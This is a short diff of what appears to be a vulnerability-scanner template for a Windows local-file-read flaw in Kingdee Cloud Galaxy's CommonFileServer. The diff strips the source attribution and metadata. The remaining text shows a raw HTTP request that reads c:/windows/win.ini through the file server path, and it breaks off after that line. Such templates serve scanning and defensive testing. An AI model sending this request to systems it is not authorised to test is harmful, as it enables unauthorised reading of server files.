@@ -3,12 +3,8 @@ info:
   name: 金蝶云星空 CommonFileServer windows文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gnazn5lvxarpyimi'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gnazn5lvxarpyimi
-    fofa: 暂无
 http:
 - raw:
   - 'GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
